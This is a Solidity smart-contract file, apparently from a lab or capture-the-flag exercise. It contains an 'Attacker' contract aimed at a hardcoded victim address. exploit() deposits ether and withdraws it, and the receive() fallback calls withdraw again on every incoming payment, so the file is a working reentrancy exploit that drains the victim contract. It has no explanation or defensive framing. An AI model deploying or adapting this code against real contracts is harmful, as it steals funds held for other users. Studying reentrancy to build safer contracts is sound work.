// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.0;

interface IVictim {
    function withdraw(uint _amount) external payable ;
    function deposit() external payable ;
}

contract Attacker {
    receive() external payable {
        IVictim(victim).withdraw(msg.value);
    }
    address victim = 0x80b4880B31E3D43aBa20237cd8d2023065Ad24f9;
    function exploit() external payable {
        IVictim(victim).deposit{value: msg.value}();
        IVictim(victim).withdraw(msg.value);
    }
}